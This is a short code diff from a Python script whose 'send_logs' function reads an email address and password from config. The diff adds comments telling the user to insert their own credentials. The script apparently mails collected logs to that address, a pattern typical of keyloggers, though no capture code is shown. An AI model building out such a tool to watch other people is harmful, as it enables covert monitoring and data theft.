@@ -79,8 +79,8 @@ def write_file(count):
 def send_logs():
 	count = 0
 
-	fromAddr = config.fromAddr
-	fromPswd = config.fromPswd
+	fromAddr = config.fromAddr #change to your email
+	fromPswd = config.fromPswd #change to your password
 	toAddr = fromAddr
 
 	MIN = 10
